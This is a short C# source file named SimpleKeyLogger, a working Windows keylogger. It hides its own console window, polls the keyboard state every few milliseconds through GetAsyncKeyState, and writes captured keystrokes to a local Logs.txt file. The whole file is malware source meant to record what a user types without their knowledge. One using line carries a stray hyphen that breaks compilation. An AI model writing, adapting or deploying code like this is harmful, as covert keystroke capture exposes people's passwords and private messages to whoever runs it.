using System;
using System.Collections.Generic;
using System.IO;-
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace SimpleKeyLogger
{

    class Program
    {
        static StringBuilder sb = new StringBuilder();

        [DllImport("User32.dll")]
        static extern int GetAsyncKeyState(int i);

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        const int SW_HIDE = 0;
        const int SW_SHOW = 5;

        static async Task Main(string[] args)
        {
            var window = GetConsoleWindow();
            ShowWindow(window, SW_HIDE);

            while (true)
            {
                await Task.Delay(5);

                for (int i = 0; i < 132; i++)
                {
                    int state = GetAsyncKeyState(i);

                    if (state == short.MaxValue + 2)
                    {
                        var c = (char) i;
                        if (char.IsControl(c))
                            sb.Append($" control char ({(int)c}) ");
                        else
                            sb.Append((char) i);

                        if (sb.Length > 250)
                        {
                            File.AppendAllText("Logs.txt", sb.ToString());
                            sb.Clear();
                        }
                    }
                }
            }
        }
    }
}

